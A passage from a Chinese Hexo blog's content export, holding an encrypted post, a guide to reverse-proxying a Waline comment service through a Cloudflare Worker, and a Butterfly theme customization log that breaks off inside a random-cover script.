d896332012f2a695f2c123391fccbff0139c7385272459149e39c4954bb0bd43b35a71269de5f897cb7f55f5fcf4295b59368f910d8fcca28bea9eba8e84a765198fc9b0d571f06826c08d477d00c242322a97b3a812c23debe281e348da1122d9113d375ea292ec228f8520d435494245cd2627388479e7f7a3d30876f7134f9adaa2a4ccb997e3493b2265801c0cb3ad95384875d424cbf7c1621686ac352dfb4d8f2c8d16145849b3908ebe061ed993ca638b56c20879842ce9c8c3a0b2efdd9c3ed551a00b14f921a67cae6e90518a220db1218b340f0d16752b072c182faa128867ae8c78172f262e625452eafdca5fa9140f58bba795accff7963237887d3328ac3c181623c78293a77226bd8388ff38391924f4a44350414e6d102e45de3a357453e5febb84b91cf892bfecb6a6e37ba4c407b5e6567f706a97569f593c7ea5f11d58fa2e44aa33d362352f6cda4ec3a480423d93d7a3eb3e02b2faa2530bfdf05922020e8eb681e150d96fd11f25656c78723b7f6946fc69c741b098a388c74ad10f01421eee8b14615302c9ebe8fc7b061e4f03e8e9ac80a86243211925015142343ed7ede6836288c1b3b9cfbac793201e862941bf30b4af35cd845f2bc05ea28076cb53dfd6d7d4d0c35d75c4f70f79f487c0807181898e71a7c8dc037c0d35290f7386e8e8c4859efe312dab4002b1b93c7c77c257d3e7f0f211c02a3ae3b66e85b80e4aec1091fdb2db1a52c3736c7737b29bc52fe40f280a8c46560d03d268973b64623534b5b98cf6a94f7c08df1c278012b3cf8396403396829a9b2113e3bae39d6c0019400b3ec1244f9eb53eeadf673e5fc77dfd5704577bfaa27eff454089f4124dc01d4462a119b8acd425d45b111572063700bad9c5ebf97aa934d94ced1b6b4bad47e94e6c8f2df8be109922d1236042613496cef90dadee8f5d03155f1cf61586bdca7589ecfa7298d9ac5107c781e0babe3fff1aafc9de3f6508d197d634edecdd39148e739e9c32e5736e12f7d3e4210b9ae5e524e73f8d87432011a059d51f2d85fa349746b2ee5bdcb6cccea764f6f925f03be7d8042223ef8ad4521414d6e7a35199f697098be8d6f92d32dbdb90d73295124e06a493093c27eb73a57eca90b437655de5a6f6d74d1f76183425222b4a5f6344403a24ab4d7ecd3151054b52eefcc7cb68535142240aba31b22742c9cad1aa0e1ca6197642fcddbf33178be1debc79e2fdc5d820e0f804d66ddeeb39a4043a24fe3e4285f43863c023a60794ac4b0a0033450d7589ecc8065370529c46c94185cadbc17da32bcecdc7530b69695312f5f68a18991d30d73de67fa4be1c3a0d107c11db2d2d6766f9232da2f1929f90dbca2a8eaee75c9ad1c70a98fe0445ad6603aedb065ace05a25cde8640cc3639b16860785b2e48f86e45a25173ce0385153b73ad65b5fef7048a682a36cb8b1c97aeb99506e024d80d8ead9367db6b696bf828cbe80a654dc8dfa4701215bbc917c413d9963aa0e1013bac6abe55ad868fd28436af2b761300bfb003a0e98b143d9338c3f1c4b5c06a60f799f55d4e9871268aa1a0d62f83f6c1202be5a81abdd0f8f8c9a690ff09738f3bcef3117085a486751890f1b352db3d8caa3fcedfa8e03b406371b7f2717777998fa9ec144fbee26d3e208403e71036d9b7d155108ac08f331abe535ce9df04fd013bd0c52afa4539e0bef5d29e107c64192134d72b50ab7bef7c0499e4c0ba6d6ccca9584ecccc9418bc265a1ab16b0bd0e00929f2afaf61802ce7714003abf381a1d2c153bbc0c088cae46dfc645ea6a07429e3b79c6dabefe10abfdd44bca7e91bb3756f5a3dc499d51b453a04e7d20b5d68aaaf07b096fccbb03d2d37a16f72b799adb702e7637186557176106194ea539b9b54330984cfabcb001b7e92e9f81c7c4e8b7d7314a3ec9ad00b829aaeb001b94542d2096a489d54bd35c2087ae9836e6fe0ef0d74a8f0c2c5523362c3083ada905bc0b8413ccc07b62c8af96524762dcf6c14997cddeb7018bcc1ca3425ec2b9859140d842c041c6adbb0abccf931bfb4fb3a859ff6f0c6cff7fde411c6935ef377392da25173286e298939ce45eba3e8fb6c89f82117461aa11e95012a0299bb9a85f6efbb8f0f0e17102b9376beb6b043d2e3f5ca718665439872a3788e1c78bc592e63562f35695a78cc73fd1a383d0dfe58ac204c51437c17d51dff3480d14b9c08956179e4bac6558b427efa6276ff0a1f99376e0ff40bcd648eb3ccec8347e565d7c2b643397d8467d4012c6b75155d23bc89e8fd23e290fefd5eb5ab877f1c78604c2c7e40c10670e01d739d29aa65124ed82607d281009d4fa13ffa7ebeb18b1f01918b545d7b48b4041d41ef95a24fd0c2bde312908d2c44b2981a13ea64d0d9fbfbd5ed69225e8945e8f4a9a64a5f519fd02a8ff95fbd4dd6916d41f075907c6b129341f336e0f791993f8126b06100107199b08ee20565c5754b70b841821fb2b63d19b56e74eec43e22a0f6ccfc180b8f3646caad6d625a9a3ae69197b97589e163aafcb9e3958ce84d7f7d2721943971f4c9b745810e53c5f1c191dbff327ded4b5e7356b73b51b76a9718b03e3d1c9c4f01a4f6abb41d5dcd107393b62d32ccdaed477a54816b3e43eecc1a443e662581a1671fe20042dcd39aa99197fc7540f00b43549eb564277c1c0af601cf92ac0ddf6887d96bdb1882e994d475a4c2299b558e568f2b7fae8f8a4694a14a4981a89ae48862f733b47466b57a9447f1db4c52e60f3ed80da4b50cc08ad99daaa1a42c629d2bb781132adea6ca4d5fe1f8213ce49eacc735bc8f8515de6bd7106e0b976b10fed06e2866409cb648a9cd3375069623368c83f98a7c1d3c6009f91c94cdf3e0d67ce7837b1e35fbd47919720e7afb3f32f0f97c08a15ca0cdc766ff4904844d4846fce5d43067e11b5d6edc0466470b1b0c4b3ad5cacc25574e7dc11a8d8c0554cbd1a14e24eaf1b1a413acd11bd465f63db8ebb14e04d033638bf646588c387f06a6fbc815a20223d349b6b7a92e462e64c5776a43bae0caee27053d7c3c00b5a11764cadb0873e8dcfe00c8eb9b3ef74c581351e23e6bea9ac0d069078b628649fb06ce7238573cd833e23fda7177d3f6ea6e48354fbbc27ea944f0a8a45fd0ba370c03fa6d1e05ab92e1ba08b3ddc236d29f7430e60a7196e5c86b13d661fa4bc5961b3afedd27122ce14c852562de95785019eaa47236d5f2f9e3567e36c81fa7a744aac31842a404bbd4de2f8770ff62e644d411f974fcdc4a7311ba53b33195bc4dd4573d55f85ec4f91bfb9d2a47a35515d22429ec1c0a7891042e8316c6a96778216f3c80c6e8ac54bc6208309fc12cee9682d8c937253304f40e1cf7b8f59401ef6bb9ef7e451c6425d668ba5b8cfa3de01459f34d9910773171e25b9fa2f450d3275147f6ff9d1086191cfd93b41c6983b15f83c0fdba94a9432b278dca57de39b21542ed7061fbb0b96e6014a7597434d44ea514c0ec245579385def1f2b5dd471274f9e66b6d0ef0d23fdb42dad867661e309ea3263343556911d65c62043606dbac95c4822074ce2329706b1f48cfbc94121c4e518d4ecc4610a5bdb879e666de34be201d975bd081d19ede952de46f8d8ba0acf96305136783a466d33c0b4f5dce6d8a62a778ee1e047cb730375beb47afa0deaa82058f2376affb59fef630aae304dfcc2c7394f20bb3dde4f5aa2ec2d452915b56d788183375a6f7177da82cf6efbdf10f7ea3187020506064f09fe510d1a698284e6ab6b515f9ad87e117ef5910cd136a2ab8a797762a70a278ea192f0faa40d048524c2b6bfd5b10811e18cf6d8d583e2647bccbdcd7e95c959b74469387f2f343e4aa2867bb33dbec325c3b82e1d94bcb8f779d238e4185ad4b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用 Cloudflare 反代网站页面</title>
      <link href="/posts/2845603730/"/>
      <url>/posts/2845603730/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="【更新】Vercel-直接绑定域名">【更新】Vercel 直接绑定域名</h2><p>破案了，直接在 vercel 绑定域名也是可以的。先前我未能成功是因为我域名的<code>SSL/TLS 加密模式</code>没配置好。在 CF 里把此处改为<code>完全</code>即可解决“重定向次数过多”的问题。这样一来，登录后台的问题也解决了。</p><p>原因是当网站开启了 CloudFlare 服务，用户访问网站时实际访问的是离用户比较近的服务器，Cloudflare 再代理用户请求我们的源服务器，以达到加速和保护源服务器的目的。</p><p>如果在 SSL 中设置了 Flexible（灵活），CDN 会以 HTTP 协议回源网站。但如果源网站支持 HTTPS 并且设置了通 HTTP 协议访问时，CDN 会自动跳转访问 HTTPS 协议。</p><p>完美的循环重定向，最后浏览器不干了，报错 ERR_TOO_MANY_REDIRECTS。</p><p>既然已经有更好地方式解决问题，本文便用作 Worker 反代的方式之一的记录。</p><hr><h2 id="前言">前言</h2><p>2022 年 8 月 LeanCloud 官方表示由于管理原因，国际版公共域名在中国大陆无法访问，对于我这种不想备案的人来说不大友好。再加上看到有人说 Valine 安全性的问题（很多偏隐私的数据在前端即可查看），心生后怕，最后综合考虑，我选择 Waline。至于 Gittalk 这种，我认为这种需要特地登录账号的评论系统不够简洁。</p><p>前文提到 Waline 的部署方式之一是 Vercel 部署，但由于 Vercel 的某些功能在科学用网方面“比较友好”，所以<code>*.vercel.app</code>域名也就被“名正言顺”地墙了，以至于一段时间内常常使用代理阅读国外项目说明文档的我没能发现这个问题 (⊙﹏⊙)。</p><p>顺带更正下前面写过一篇配置 Valine/Waline 的文章的问题。</p><ol><li>Valine 由于我自暂未研究明白，且看在 Waline 后台方面便选择后者。Waline 在部署完后，如果主题有预留评论系统的配置项，在<strong>主题配置文件</strong>中只需在 Waline 填写生成的访问链接即可，无需额外引入 js 等，包括 leancloud 提供的域名。</li><li>使用海外版的 LeanCloud 也可以在国内访问，可以通过 Cloudflare 反代曲线救国解除封印。【我知道直接在 vercel 处理完域名就万事大吉了，可惜当时没解决。】</li></ol><h2 id="做法">做法</h2><blockquote><p>我默认你的 Waline 已经在 Vercel 部署完成，打开代理时，使用其默认分配的<code>vercel.app</code>域名可以正常加载评论系统。同时，我默认你手头有一个在 Cloudflare 正常解析的域名。</p></blockquote><blockquote><p>此方法适用于几乎任意明网的反代。</p></blockquote><p>打开并登录 Cloudflare 控制台，在左侧菜单找到<code>Workers 和 Pages</code>一项，在<code>概述</code>标题下方找到<code>创建应用程序</code>按钮（此处我已创建过了）。</p><p><img src="https://s2.loli.net/2023/09/13/DiMclA3NRHYLGQf.png" alt="【图 1】" title="【图 1】"></p><p>选择 Worker 一路默认，名称随意，最后点击部署按钮。</p><p><img src="https://s2.loli.net/2023/09/13/hO3LJDqCGXnHr1t.png" alt="【图 2】" title="【图 2】"></p><p>回到<code>概述</code>，点击你刚才创建的 Worker，点击右上方<code>快速编辑</code>，删除其中所有内容，并替换为以下内容（下文为截至此文前我使用的方案。你有别处搜索到更好的也可以使用）：</p><p><img src="https://s2.loli.net/2023/09/13/v9ABNzlDaHImpE5.png" alt="【图 3】" title="【图 3】"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&quot;fetch&quot;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(event.<span class="property">request</span>.<span class="property">url</span>);</span><br><span class="line">  url.<span class="property">protocol</span> = <span class="string">&#x27;https:&#x27;</span></span><br><span class="line">  url.<span class="property">hostname</span> = <span class="string">&quot;【你想要代理的域名，前后不加斜杠、https 等】&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> request = <span class="keyword">new</span> <span class="title class_">Request</span>(url, event.<span class="property">request</span>);</span><br><span class="line">  event.<span class="title function_">respondWith</span>(<span class="title function_">fetch</span>(request));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/09/13/wOMECZpXFsJzbTn.png" alt="【图 4】" title="【图 4】"></p><p>如果你使用 pages 部署，则此处的代码应修改如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">fetch</span>(<span class="params">request, env</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">      <span class="keyword">if</span> (url.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">        url.<span class="property">hostname</span>=<span class="string">&quot;【你想要代理的域名，前后不加斜杠、https 等】&quot;</span>;</span><br><span class="line">        <span class="keyword">let</span> new_request=<span class="keyword">new</span> <span class="title class_">Request</span>(url,request);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">fetch</span>(new_request);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 否则，提供静态资产。</span></span><br><span class="line">      <span class="keyword">return</span> env.<span class="property">ASSETS</span>.<span class="title function_">fetch</span>(request);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，你也可以手动创建一个名为<code>_worker.js</code>的文件，将上面的代码（Worker 用第一个，Pages 用第二个）粘贴进去并修改相关地址，然后手动上传；对于 pages 可以将此文件上传至 GitHub ，然后在CF 控制台内创建 pages 并拉取仓库，方便更新。</p><p>如果一切正常，右侧会返回 200 表示发送接收成功。</p><h2 id="域名绑定">域名绑定</h2><p>很显然，CF 的这个功能，创建镜像站点，一定程度上能够轻松绕过防火墙访问一些内容，对科学用网“十分友好”（不排除正常使用该功能加速网站的用户），所以<code>*.worker.dev</code>这个域名的下场和上文 vercel 那个大差不差，需要使用自己的域名来解决这一问题。</p><p>这绑定域名没什么好讲解的了，从<code>概述</code>界面点击进入你刚才创建的 worker 详细界面，点击<code>Custom Domains</code>（详见图三中“预览”字样下方），往下找到<code>自定义域</code>，点击<code>添加自定义域</code>，按照提示绑定。</p><p><img src="https://s2.loli.net/2023/09/13/FzZEhQyHvMJlatR.png" alt="【图 5】" title="【图 5】"></p><p>完成后等待域名<code>证书</code>一栏变绿显示<code>有效</code>即可</p><h2 id="后记">后记</h2><p>这只能解决评论区正常使用的问题，管理员登录的问题还没解决（只能用那个被墙的<code>vercel.app</code>域名，可能是我还未研究透彻）。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloudflare </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Butterfly 个人美化记录</title>
      <link href="/posts/1477501590/"/>
      <url>/posts/1477501590/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>建议先配置好 Hexo 并确保其能正常使用。</p><p>插件卸载指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall &lt;插件名&gt;</span><br></pre></td></tr></table></figure><p>注：</p><ol><li>本文借鉴/搬运部分均标注原文链接（除非二次修改程度极高）。有些片段因格式不方便但自己修改时使用到，将只放原文链接；</li><li>本文为我自己修改时借鉴或探索时使用到教程的记录，算是“索引”和笔记，可能不适用于你的网站，参考时请根据自己情况酌情修改；</li><li>如果你打算参考这个记录教程，建议看完相关段落后再操作，不要第一遍看就跟着做。</li></ol><hr><h2 id="前言">前言</h2><p>如你所见，Hexo 的有些主题可玩性非常高，看着无相似性的几个 Hexo 站点，没准用的是同一套主题……</p><p>本文谨以记录本人折腾博客时用到的教程，以防某日玩脱了找不到回家的路。</p><p>为方便起见，博客根目录记为<code>【Blogroot】</code>，域名记为<code>www.example.com</code>，自定义内容优先放在主题配置文件中，少部分会涉及到 hexo 根目录下配置文件。</p><p>本文提及的目录、配置等均为默认安装的样子，你若有自定义的请结合实际。有些教复杂但官方教程写得详细的，此处一笔带过。</p><p>本文当前对应环境：</p><table><thead><tr><th>名称</th><th>整理教程时最开始环境版本</th><th>本文最近一次更新时环境版本</th></tr></thead><tbody><tr><td>hexo</td><td>^6.3.0</td><td>^7.0.0</td></tr><tr><td>hexo-theme-butterfly</td><td>^4.9.0</td><td>^4.11.0</td></tr><tr><td>node.js</td><td>^18.（？）</td><td>^20.10.1</td></tr></tbody></table><p>行数标注对应我的配置文件，但相应代码应该大差不差。</p><p>yaml 大小写敏感、yaml 以缩进表示层级关系、yaml 中冒号后空一格再写内容……为防止因格式造成的问题，请在使用时自查代码缩进关系。</p><p>实际上，自定义引入文件（如图片、css、js 等），最好在<code>【Blogroot】/source</code>目录下创建文件夹放置，而不应放到<strong>主题文件夹</strong>，以防更新主题时误删。本文中如有说将上述类型文件存到<code>【Blogroot】/theme</code>目录下某处时，请酌情修改自己的实操方案。【至于 pug、stylus 等类型的文件，为保险起见，最好保持原来路径，不作修改。】</p><p>除非强调，否则配置内容时修改的 config 可自行选择。本索引为管理方便，<strong>一般</strong>与主题关联度大的修改于<code>_config.\[theme\].yml</code>中，与“系统”关联度大的（例如文章加密、缓存等）放在<code>_config.yml</code>中。</p><blockquote><p>Hexo 在合并主题配置时，Hexo 配置文件中的 <code>theme_config</code> 的优先级最高，其次是 <code>_config.\[theme\].yml</code> 文件，最后是位于主题目录下的 <code>_config.yml</code> 文件。</p></blockquote><h2 id="安装主题">安装主题</h2><p>（此段引用<a href="https://butterfly.js.org/posts/21cfbf15" rel="external nofollow noreferrer">https://butterfly.js.org/posts/21cfbf15</a>官方教程）</p><p>在【Blogroot】（文件夹）中打开 Git（没配置 Hexo 主程序的请移步至之前文章），输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>Hexo 需要 Pug 和 Stylus 渲染器，可使用命令安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>之后还是在【Blogroot】中找到<code>_config.yml</code>文件，使用编辑器打开，找到<code>theme: </code>并修改此行为<code>theme: butterfly</code></p><p>为减少主题升级带来的不便，可将<strong>主题</strong>的配置文件<code>【Blogroot】/themes/butterfly/_config.yml</code>复制到【Blogroot】目录下，并重命名为<code>_config.butterfly.yml</code>，之后修改主题的配置均可只修改此文件。</p><blockquote><p>注意：</p></blockquote><ol><li>不要把主题目录的 <code>_config.yml</code> 删掉；</li><li>以后只需要在 <code>_config.butterfly.yml</code> 进行配置就行。如果使用了 <code>_config.butterfly.yml</code>， 配置主题的 <code>_config.yml</code> 将不会有效果；</li><li>Hexo 会自动合并主题中的 <code>_config.yml</code> 和 <code>_config.butterfly.yml</code> 里的配置，如果存在同名配置，会使用 <code>_config.butterfly.yml</code> 的配置，其优先度较高。</li></ol><p>到这里主题算是安装完成。</p><h2 id="Butterfly-自定义">Butterfly 自定义</h2><h3 id="常用基础配置修改索引">常用基础配置修改索引</h3><p><strong>常见</strong>（字面意思）可用修改有：</p><h4 id="自定义导航与页面">自定义导航与页面</h4><ul><li><code>_config.butterfly.yml</code>中 menu</li></ul><p>此处修改后，有些页面可能不存在，此时需要在<code>【Blogroot】/source</code>目录下建立同名文件夹，文件夹内创建<code>index.md</code>（可用 hexo 原生命令或第三方编辑器如 Hexon、ESHexoN 等完成）。自己添加页面也是同理，将自定义页面添加至导航请参考导航处格式。补充：此处导航前文字是可以修改的。</p><p>修改例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  主页：/ || fas fa-home</span><br><span class="line">  归档：/archives/ || fas fa-archive</span><br><span class="line">  ## 标签：/tags/ || fas fa-tags</span><br><span class="line">  分类：/categories/ || fas fa-folder-open</span><br><span class="line">  ## 清单||fas fa-list:</span><br><span class="line">  ##   Music: /music/ || fas fa-music</span><br><span class="line">  ##   Movie: /movies/ || fas fa-video</span><br><span class="line">  友链：/link/ || fas fa-link</span><br><span class="line">  关于：/about/ || fas fa-heart</span><br></pre></td></tr></table></figure><p>请在<code>【Blogroot】/source</code>中创建<code>about</code>、<code>categories</code>、<code>link</code>文件夹（与上方文字对应关系不需多说），并分别在文件夹中创建<code>index.md</code>，里面的格式应该不需要多说了，官网有创建单页的教程，很详细；民间也有。</p><p>【PS：单页中可以有一定的 CSS 代码与 HTML 代码，但不能有 JS】</p><h4 id="简单自定义背景">简单自定义背景</h4><ul><li><code>_config.butterfly.yml</code>中 Image （圖片設置）</li></ul><h4 id="主页标题">主页标题</h4><ul><li><p><code>_config.butterfly.yml</code>中 blog_title_font、subtitle</p></li><li><p><code>_config.yml</code>中 Site</p></li></ul><h4 id="Pjax">Pjax</h4><ul><li><code>_config.butterfly.yml</code>中 pjax</li></ul><h4 id="引入外部资源">引入外部资源</h4><ul><li><code>_config.butterfly.yml</code>中 inject</li></ul><p>注：建议 head 后加 css、bottom 后加 js</p><h4 id="文章过期提醒">文章过期提醒</h4><ul><li><code>_config.butterfly.yml</code>中 noticeOutdate</li></ul><h3 id="进阶修改索引">进阶修改索引</h3><h4 id="全局美化（参考）">全局美化（参考）</h4><p><a href="https://moonshuo.cn/" rel="external nofollow noreferrer">https://moonshuo.cn/</a></p><h4 id="博客背景使用一图流">博客背景使用一图流</h4><p><a href="https://qianchenggit.github.io/" rel="external nofollow noreferrer">https://qianchenggit.github.io/</a></p><p>打开<code>_config.butterfly.yml</code>文件，找到图片相关<code>（banner）</code>几个，后面的图片都留空不填，如果和本站效果相仿请直接改成下方内容（注释已去除）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">## Disable all banner image</span><br><span class="line">disable_top_img: false ## 【取消首页全屏的图片】</span><br><span class="line"></span><br><span class="line">index_img: transparent ## 【此处为透明效果】</span><br><span class="line"></span><br><span class="line">default_top_img: 【改成你自己的图片地址，不想要其他图片的改法同上方 index_img】</span><br><span class="line"></span><br><span class="line">archive_img: 【改成你自己的图片地址，不想要其他图片的改法同上方 index_img】</span><br><span class="line"></span><br><span class="line">tag_img:</span><br><span class="line"></span><br><span class="line">tag_per_img:</span><br><span class="line"></span><br><span class="line">category_img:</span><br><span class="line"></span><br><span class="line">category_per_img:</span><br></pre></td></tr></table></figure><p>还是这个文件，找到以下内容并修改（已去除部分注释）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## Website Background （設置網站背景）</span><br><span class="line">background: url() ## 【括号内换成自己希望使用的背景图地址】</span><br><span class="line"></span><br><span class="line">## Footer Background</span><br><span class="line">footer_bg: transparent ## 【页脚透明】</span><br></pre></td></tr></table></figure><p>不喜欢黑色笼罩层的请再往下多看一行（为 header 或 footer 添加黑色半透遮罩）（这里我没试过。当然，另使用 CSS 修改也是可行的）</p><p>之后 Hexo 三连即可生效。如果不喜欢此时的样式，请另行参考网上各路大神自定义的 CSS。</p><h4 id="随机图片封面">随机图片封面</h4><h5 id="直接填写">直接填写</h5><p>如果是使用多个 api 或填入多个图片地址则可不使用此方法，直接在<code>_config.butterfly.yml</code>文件中<code>cover:</code>后添加即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default_cover: </span><br><span class="line">  - 【图片路径或 api】</span><br></pre></td></tr></table></figure><h5 id="使用-js-支持随机图片-api">使用 js 支持随机图片 api</h5><p><a href="https://blog.mitsumune.top/" rel="external nofollow noreferrer">https://blog.mitsumune.top/</a></p><p>打开【Blogroot】下/themes/butterfly/scripts 目录，新建一个 <code>random_img.js</code> 文件，复制以下内容并保存：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Butterfly</span></span><br><span class="line"><span class="comment"> * ramdom cover</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span></span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;before_post_render&#x27;</span>, <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; config &#125; = <span class="variable language_">this</span></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="property">post_asset_folder</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> imgTestReg = <span class="regexp">/\.(png|jpe?g|gif|svg|webp)(\?.*)?$/</span></span><br><span class="line">    <span class="keyword">const</span> topImg = data.<span class="property">top_img</span></span><br><span class="line">    <span class="keyword">const</span> cover = data.<span class="property">cover</span></span><br><span class="line">    <span class="keyword">if</span> (topImg &amp;&amp; topImg.<span class="title function_">indexOf</span>(<span class="string">&#x27;/&#x27;</span>) === -<span class="number">1</span> &amp;&amp; imgTestReg.<span class="title function_">test</span>(topImg)) data.<span class="property">top_img</span> = data.<span class="property">path</span> + topImg</span><br><span class="line">    <span class="keyword">if</span> (cover &amp;&amp; cover.<span class="title function_">indexOf</span>(<span class="string">&#x27;/&#x27;</span>) === -<span class="number">1</span>) data.<span class="property">cover</span> = data.<span class="property">path</span> + cover</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data.<span class="property">cover</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    data.<span class="property">randomcover</span> = <span class="title function_">randomCover</span>()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  data.<span class="property">cover</span> = data.<span class="property">cover</span> || <span class="title function_">randomCover</span>()</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">&#125;,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">randomCover</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> theme = hexo.<span class="property">theme</span>.<span class="property">config</span></span><br><span class="line">  <span class="keyword">let</span> cover</span><br><span class="line">  <span class="keyword">let</span> num</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (theme.<span class="property">cover</span> &amp;&amp; theme.<span class="property">cover</span>.<span class="property">default_cover</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(theme.<span class="property">cover</span>.<span class="property">default_cover</span>)) &#123;</span><br><span class="line">      cover = theme.<span class="property">cover</span>.<span class="property">default_cover</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      num = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * theme.<span class="property">cover</span>.<span class="property">default_cover</span>.<span class="property">length</span>)</span><br><span class="line">      cover = theme.<span class="property">cover</span>.<span class="property">default_cover</span>[num]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cover 